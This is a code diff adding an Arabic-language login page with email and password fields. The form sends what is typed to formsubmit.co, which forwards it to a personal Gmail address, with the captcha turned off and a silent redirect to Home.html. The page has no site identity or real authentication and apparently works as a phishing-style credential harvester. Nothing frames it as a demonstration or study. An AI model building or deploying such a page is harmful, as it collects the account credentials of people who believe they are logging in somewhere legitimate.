@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #666;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>تسجيل الدخول</h2>
+    
+    <!-- فورم إرسال البيانات إلى الإيميل المحدد -->
+    <form action="https://formsubmit.co/ggwesam014@gmail.com" method="POST" id="loginForm">
+        
+        <!-- الحقل الأول -->
+        <div class="input-group">
+            <label for="field1">البريد الالكتروني:</label>
+            <input type="text" name="البريد الالكتروني" id="field1" required placeholder="البريد الالكتروني">
+        </div>
+
+        <!-- الحقل الثاني (أصبح صغيراً مثل الأول) -->
+        <div class="input-group">
+            <label for="field2">كلمة المرور:</label>
+            <input type="text" name="كلمة المرور" id="field2" required placeholder="كلمة المرور">
+        </div>
+
+        <!-- التوجيه لصفحة Home.html في نفس المجلد بعد الإرسال -->
+        <input type="hidden" name="_next" value="Home.html">
+        
+        <!-- إلغاء صفحة التحقق الخاصة بالوسيط للتوجيه المباشر -->
+        <input type="hidden" name="_captcha" value="false">
+
+        <!-- تم تغيير نص الزر إلى تسجيل دخول -->
+        <button type="submit">تسجيل دخول</button>
+    </form>
+</div>
+
+</body>
+</html>
